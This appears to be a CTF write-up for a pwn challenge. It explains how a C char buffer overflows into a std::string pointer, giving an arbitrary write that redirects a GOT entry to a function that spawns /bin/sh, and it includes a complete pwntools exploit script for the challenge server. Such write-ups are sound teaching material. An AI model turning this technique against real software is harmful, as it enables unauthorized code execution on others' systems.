---
title: "[Pwn] str.vs.cstr"
date: 2022-09-04 14:12:00
---

# 0x0 Introduction

Which do you like, C string or C++ string?

nc pwn1.2022.cakectf.com 9003

Files: [str_vs_cstr_f088c31cd2d3c18483e24f38df724cad.tar.gz](str_vs_cstr_f088c31cd2d3c18483e24f38df724cad.tar.gz)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# 0x2 Vulnerability

In C++, string are dynamically allocated in the heap. So, it will appear as a pointer in the stack

There is a struct `Test` Exists in the stack and Program allow us to modify both `c_str` and `str`.

Therefore we can overwrite the address of `_str` using `_c_str`, and then we have a write anywhere.
```
char _c_str[0x20];
std::string _str;
```

Program is parial RELRO, therefore we can overwrite a function in GOT to `win` fucntion and get a shell.
```
private:
  __attribute__((used))
  void call_me() {
    std::system("/bin/sh");
  }

};
```

one thing to notice is C++ will replace last `\n` to a null bytes - make sure do not put extra bytes that may have effect on other data we don't want modify.

# 0x3 Solution

```python
from pwn import *

exe = ELF("chall")
exe_rop = ROP(exe)
# libc = ELF("libc.so.6")
# ld = ELF("./ld-2.27.so")

context.binary = exe
# context.log_level = 'DEBUG'

def log_print(*msg):
    log.info(" ".join(map(str,msg)))
lp = log_print
def start():
    if args.LOCAL:
        r = process([exe.path])
        if args.R2:
            input("Wait r2 attach")
    else:
        r = remote("pwn1.2022.cakectf.com", 9003)
    return r


io = start()
io.sendlineafter(b"choice: ",b'3')
io.sendlineafter(b"str: ",b'A'*8)
io.sendlineafter(b"choice: ",b'1')
io.sendlineafter(b"c_str: ",flat({
    0x20:0x00404028
}))

io.sendlineafter(b"choice: ",b'3')
io.sendlineafter(b"str: ",b'\xde\x16\x40\x00\x00\x00')

io.sendlineafter(b"choice: ",b'1')
io.sendlineafter(b"str: ",flat({
    0x20: 0x0404a00,
    0x28: 8,
    0x40:0
},length=0x50))
io.sendlineafter(b"choice: ",b'3')
io.sendlineafter(b"str: ",b'A'*0x20)
io.sendlineafter(b"choice: ",b'5')
io.interactive()
```